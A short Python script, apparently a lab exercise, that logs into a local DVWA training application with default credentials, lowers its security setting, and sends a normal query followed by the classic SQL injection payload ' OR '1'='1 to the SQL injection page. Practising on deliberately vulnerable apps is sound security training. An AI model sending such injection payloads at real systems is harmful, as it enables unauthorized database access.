import requests

session = requests.Session()

# Login and set security
login_data = {'username': 'admin', 'password': 'password', 'Login': 'Login'}
session.post("http://localhost/login.php", data=login_data)

security_data = {'security': 'low', 'submit': 'Submit'}
session.post("http://localhost/security.php", data=security_data)

# Test normal query
url = "http://localhost/dvwa/vulnerabilities/sqli/"
response = session.get(url, params={"id": "1", "Submit": "Submit"})
print("=== Normal Query (id=1) ===")
print(response.text[:500])
print("\n")

# Test SQL injection
response = session.get(url, params={"id": "' OR '1'='1", "Submit": "Submit"})
print("=== SQL Injection Query (id=' OR '1'='1) ===")
print(response.text[:500])
